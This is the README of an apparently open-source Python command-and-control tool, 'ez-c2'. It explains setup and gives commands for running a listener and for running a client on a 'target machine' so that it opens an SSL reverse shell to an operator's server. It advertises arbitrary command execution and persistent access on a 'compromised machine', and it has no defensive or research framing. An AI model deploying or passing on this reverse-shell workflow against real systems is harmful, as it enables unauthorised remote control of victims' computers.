init!

# Intro

ez-c2 is a lightweight and minimal Command & Control (C2) server written in Python 3. It enables remote shell access via SSL, making it easy to manage a compromised machine from the command line interface (CLI).




# Getting started

Clone the repository and set up your Python virtual environment: 

```bash
git clone https://github.com/auteqia/ez-c2.git
cd ez-c2/
python3 -m venv venv
chmod +x ./venv/bin/activate
./venv/bin/activate
```

Install any dependencies if required (Add this if your script has a requirements.txt): 

```bash
pip install -r requirements.txt
```


# Usage

It can be used server-side or client-side. 


## Server-side | Listening

Start the C2 server and specify the port to listen on: 
```bash
Usage: python3 script.py -listen <port>
```

Example: 
```bash
python3 script.py -listen 4443
```

## Client-side | Connecting

Run the client script on the target machine to initiate a reverse shell: 
```bash
python3 -connect <server_ip> <server_port>
```
Example: 
```bash
python3 script.py -connect 192.168.1.100 4443
```
The client will establish an SSL connection to the server and spawn a shell. 


# What can you do with ez-c2 ?

Once connected, ez-c2 allows the operator to: 

- Execute arbitrary system commands on the client-side machine
- Receive output of commands via a secure SSL tunnel
- Maintain persistent shell access (implementation dependent)
    


